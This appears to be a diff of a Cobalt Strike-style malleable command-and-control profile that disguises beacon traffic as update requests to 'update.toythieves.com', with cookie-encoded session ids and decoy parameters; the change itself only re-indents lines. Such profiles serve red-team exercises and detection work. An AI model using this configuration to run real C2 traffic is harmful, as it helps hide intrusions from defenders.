@@ -20,7 +20,7 @@ http-get {
 
         header "Host" "update.toythieves.com";
         header "Accept" "*/*";
-	header "Cookie" "0449651003fe48-Nff0eb7";
+	    header "Cookie" "0449651003fe48-Nff0eb7";
         parameter "action" "Execute";
         
         metadata {
@@ -69,12 +69,12 @@ http-post {
         }
         
         parameter "Filename" "avgnt.dat";
-	parameter "Param" "120.88.46.206";
+	    parameter "Param" "120.88.46.206";
         
         id {
             base64url;
-	    prepend "0449651003fe48-";
-	    header "Cookie";
+	        prepend "0449651003fe48-";
+	        header "Cookie";
 
         }
     }
